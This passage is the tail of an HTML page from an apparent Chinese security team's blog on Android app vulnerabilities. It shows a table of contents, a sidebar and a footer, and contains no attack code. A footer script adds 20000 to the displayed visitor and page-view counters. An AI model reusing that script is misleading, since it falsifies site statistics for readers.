class="nav-text">（1）备份安全设置信息泄露漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="nav-text">&lt;1&gt; 漏洞复现</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-%E6%BC%8F%E6%B4%9E%E8%AF%B4%E6%98%8E"><span class="nav-text">&lt;2&gt; 漏洞说明</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-3-gt-%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">&lt;3&gt; 安全防护</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89debuggable-%E5%AE%89%E5%85%A8%E9%A3%8E%E9%99%A9"><span class="nav-text">（2）debuggable 安全风险</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-%E4%BD%BF%E7%94%A8mprop"><span class="nav-text">&lt;1&gt; 使用mprop</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-%E4%BD%BF%E7%94%A8Xposed%E6%A8%A1%E5%9D%97"><span class="nav-text">&lt;2&gt; 使用Xposed模块</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-3-gt-%E7%B3%BB%E7%BB%9F%E5%AE%9A%E5%88%B6"><span class="nav-text">&lt;3&gt; 系统定制</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89exported%E5%AF%BC%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="nav-text">（3）exported导出漏洞</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-WebView%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E"><span class="nav-text">2. WebView安全配置漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="nav-text">（1）漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E6%A1%88%E4%BE%8B"><span class="nav-text">（2）漏洞案例</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-1-gt-WebView%E5%AF%86%E7%A0%81%E6%98%8E%E6%96%87%E5%AD%98%E5%82%A8%E6%BC%8F%E6%B4%9E%E2%80%94%E2%80%94setSavePassword-true"><span class="nav-text">&lt;1&gt; WebView密码明文存储漏洞——setSavePassword(true)</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#lt-2-gt-WebView%E5%9F%9F%E6%8E%A7%E5%88%B6%E4%B8%8D%E4%B8%A5%E6%A0%BC%E6%BC%8F%E6%B4%9E"><span class="nav-text">&lt;2&gt; WebView域控制不严格漏洞</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">（3）安全防护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%AE%9E%E9%AA%8C%E6%80%BB%E7%BB%93"><span class="nav-text">六、实验总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE"><span class="nav-text">七、参考文献</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安全后厨团队"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">安全后厨团队</p>
+  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/WindXaa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;WindXaa" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://bbs.pediy.com/user-home-905443.htm" title="看雪 → https:&#x2F;&#x2F;bbs.pediy.com&#x2F;user-home-905443.htm" rel="noopener" target="_blank"><i class="gratipay fa-fw"></i>看雪</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	  
+	  <div class="wechat_OA">
+		<span><b>公众号</b></span>
+		<br>
+		<!-- 这里添加你的二维码图片 -->
+		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/weChat.jpg" alt="二维码">
+	  </div>
+	  <div class="wechat_OA">
+		<span><b>知识星球</b></span>
+		<br>
+		<!-- 这里添加你的二维码图片 -->
+		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website%2Fstar.png" alt="知识星球">
+	  </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安全后厨团队</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共184.3k字</span>
+</div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
